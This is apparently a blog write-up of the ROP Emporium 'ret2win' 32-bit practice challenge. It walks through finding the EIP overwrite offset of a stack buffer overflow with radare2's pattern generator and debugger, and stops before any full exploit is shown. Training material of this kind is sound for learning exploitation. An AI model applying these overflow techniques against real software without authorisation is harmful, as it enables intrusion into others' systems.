---
layout: post
title: ROP Emporium - Ret2Win
tags: [rop]
---

<p style="text-align: justify;">
In this challenge, we need to redirect the program flow to execute the ret2win address. This can be achieved by overwriting EIP (Instruction Pointer) with the ret2win address. This challenge can be done using simple echo command or pwntools. I use Radare2 and pwntools to solves this challenge.
<br></p>
<p style="text-align: justify;">
First thing first, lets find the EIP offset as shown on below snippets. The `ragg2 -P 100 -r > fuzzing.txt`  command used to create pattern and save it into a file named fuzzing.txt. Then create R2 profile that will accept standard input from the fuzzing.txt file. The `r2 -de dbg.profile=profile.rr2 ret2win32` command used to open the binary using R2 in debug mode and loading the R2 profile file. Inside the radare, use `dc` command to run the program and after crashing use `wopO `dr eip``  command to find the EIP offset.
<br></p>
```
root@Perseverance:~/rop_emporium/ret2win32# ragg2 -P 100 -r > fuzzing.txt 
root@Perseverance:~/rop_emporium/ret2win32# echo '#!/usr/bin/rarun2' > profile.rr2
root@Perseverance:~/rop_emporium/ret2win32# echo 'stdin=./fuzzing.txt' >> profile.rr2
root@Perseverance:~/rop_emporium/ret2win32# cat profile.rr2 
#!/usr/bin/rarun2
stdin=./fuzzing.txt

root@Perseverance:~/rop_emporium/ret2win32# r2 -de dbg.profile=profile.rr2 ret2win32 
Process with PID 3580 started...
= attach 3580 3580
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
glibc.fc_offset = 0x00148
[0xf7fcd0b0]> dc
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, 
we're using fgets!

> child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41415041 code=1 ret=0
[0x41415041]> wopO `dr eip`
44
```
<br><br>
